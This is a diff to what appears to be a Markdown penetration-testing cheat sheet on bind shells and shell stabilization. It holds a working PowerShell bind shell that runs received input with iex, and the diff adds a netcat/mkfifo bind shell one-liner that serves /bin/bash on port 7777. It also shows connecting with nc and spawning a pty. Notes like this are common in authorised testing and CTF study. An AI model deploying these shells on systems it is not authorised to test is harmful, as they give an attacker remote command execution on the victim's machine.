@@ -46,6 +46,14 @@ The target opens a port. You connect to them.
 > powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
 > ```
 
+
+> [!NOTE] BIND Shell NC
+```
+ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l <host ip> 7777 > /tmp/f
+```
+
+
+
 ### 🔗 Your Connection
 
 Bash
@@ -60,7 +68,7 @@ nc -nv 10.10.10.1 1234
 
 Standard shells are "dumb" (no Tab-complete, no `Ctrl+C`). Follow this exact sequence:
 
-> [!SUCCESS] **The 4-Step Stabilization**
+> [!quote] **The 4-Step Stabilization**
 > 
 > 1. **Spawn Bash:** `python3 -c 'import pty; pty.spawn("/bin/bash")'` (or `script /dev/null -c bash`)
 >     
